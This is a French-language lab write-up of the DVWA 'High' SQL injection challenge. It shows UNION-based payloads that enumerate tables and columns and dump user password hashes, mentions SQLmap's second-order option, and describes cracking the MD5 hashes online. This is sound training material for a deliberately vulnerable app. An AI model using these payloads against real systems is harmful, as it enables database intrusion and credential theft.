# Niveau "High"

Un changement au niveau de l’interface pour ce niveau « High ». Une pop-up est disponible pour insérer l’objet de la recherche et le résultat s’affiche sur la fenêtre principale :

![](../../../../.gitbook/assets/a1dd1c57a6575a56ff5864b9dac6743f.png)

L'injection du caractère `"'"` retourne une erreur générique :

![](../../../../.gitbook/assets/03a2758c4de27662e8d49b251f3d11c4.png)

Le fait que l'erreur soit générique n'est pas vraiment gênant, car cela indique bien que le caractère spécial semble être traité comme du code et non comme faisant partie de la donnée. L'injection semble donc être toujours possible :

```sql
6' UNION SELECT 1,2 -- 
```

![](../../../../.gitbook/assets/65391a169a41499b078eabb505cb0762.png)

Récupération des noms des tables :

```sql
'6' UNION SELECT table_name,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema = 'dvwa' -- 
```

![](../../../../.gitbook/assets/bd172c5f7f2447b1243ecd39d9e6992b.png)

Récupération des noms des colonnes :

```sql
'6' UNION SELECT column_name,2 FROM INFORMATION_SCHEMA.columns WHERE table_schema = 'dvwa' -- 
```

![](../../../../.gitbook/assets/d1ea95501c569208c5423279891f13e0.png)

Puis finalement des noms et empreintes des mots de passe des utilisateurs :

```sql
'6' UNION SELECT user,password FROM dvwa.users --  
```

![](../../../../.gitbook/assets/448bc597599a9c79565ffafaa5be8012.png)

L'erreur générique n'augmente pas réellement la difficulté du challenge par rapport au niveau "Low" mais la présence d'une seconde fenêtre peut empêcher les outils automatisés de fonctionner.

L'injection présente ici est une injection nommée "second ordre", et sans l'indiquer explicitement à l'outil il peut ne pas réussir à l'exploiter.

{% hint style="info" %}
Sous `SQLmap` il est possible d'utiliser l'option `--second-order` pour ce type d'injection
{% endhint %}

Une fois fait, la dernière étape reste de cracker les hash md5 (32 caractères) des mots de passe en utilisant par exemple [crackstation.net](https://crackstation.net/) :

![](<../../../../.gitbook/assets/80ef0f7a16a8a069f943e801429ef8f7 (1).png>)
